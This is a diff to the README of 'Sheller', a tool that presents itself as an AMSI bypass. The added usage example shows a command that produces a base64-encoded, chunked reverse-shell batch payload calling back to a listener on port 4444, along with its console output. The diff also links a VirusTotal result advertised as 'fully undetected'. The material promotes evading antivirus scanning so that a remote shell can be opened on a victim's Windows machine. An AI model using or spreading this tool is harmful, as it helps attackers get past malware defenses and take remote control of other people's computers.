@@ -41,9 +41,25 @@ optional arguments:
 
 
 # Example
-``
-python sheller.py -s xy.bat -lh lh -lp 4444 -b64 -ch -v: 
-``
+```
+root@lukeproducts:~/Sheller# python3 sheller.py -s xy.bat -lh lh -lp 4444 -b64 -ch -v
+
+Copyright LukeProducts 2022, all rights reserved
+ ┌──────────────────────────────────────┐       
+ │                   ▼         ##       │       
+ │ ┌─────────────────┘    ┌────##───┐   │       
+ │ │AMSI Bypass Tool      │    ##   │   │       
+ │ └──────────────────────┘    ##   └─► │       
+ │                             ##       │       
+ │ © Copyright by LukeProducts ##       │       
+ └──────────────────────────────────────┘       
+
+
+Host set to "LukeProuctsKali" (192.168.0.129)
+
+[*] Successfully exported payload to "xy.bat" with encoding base64 and chunked up 87 times!
+listening on [any] 4444 ...
+```
 
 <a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Results</a>
 
